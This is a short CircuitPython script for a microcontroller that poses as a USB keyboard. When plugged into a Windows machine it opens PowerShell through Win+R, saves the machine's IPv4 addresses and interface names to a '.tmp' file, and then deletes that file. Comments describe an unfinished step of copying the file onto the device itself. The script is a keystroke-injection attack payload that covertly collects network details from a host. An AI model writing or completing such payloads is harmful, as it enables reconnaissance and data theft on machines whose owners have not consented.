import board
import digitalio
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode # may not be needed
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
kbd = Keyboard(usb_hid.devices)
# layout.write('xxx\n')
# windows vs linux checkout
kbd.send(Keycode.WINDOWS,Keycode.R)
time.sleep(0.2)
layout.write('powershell.exe\n')
time.sleep(1)
layout.write('Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,InterfaceAlias,SuffixOrigin | where IPAddress -notmatch "(127.0.0.1|169.254.\d+.\d+)" > .tmp\n')
# find device location of CIRCUITPY and move .tmp to CIRCUITPY
# saves .tmp to system, now have to move .tmp to pico
time.sleep(0.2)
layout.write('rm ".tmp"\n')
# data > ".tmp"
# Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,InterfaceAlias | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)'